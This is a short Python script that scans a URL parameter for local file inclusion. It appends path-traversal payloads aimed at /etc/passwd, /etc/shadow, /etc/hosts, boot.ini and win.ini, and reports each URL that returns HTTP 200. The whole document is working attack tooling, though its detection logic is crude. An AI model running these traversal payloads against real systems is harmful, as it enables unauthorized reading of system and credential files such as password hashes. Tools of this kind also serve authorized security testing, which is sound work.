import requests

def lfi_scan(url, payloads):
    for payload in payloads:
        target_url = url + payload
        response = requests.get(target_url)
        if response.status_code == 200:
            print(f"Potential LFI found: {target_url}")

# Example payloads to test for LFI
payloads = [
    "../../../../etc/passwd",
    "../../../../etc/hosts",
    "../../../../etc/shadow",
    "../../../../boot.ini",
    "../../../../windows/win.ini",
    # Add more payloads as needed
]

# URL to scan for LFI vulnerability
target_url = "http://example.com/page.php?file="

lfi_scan(target_url, payloads)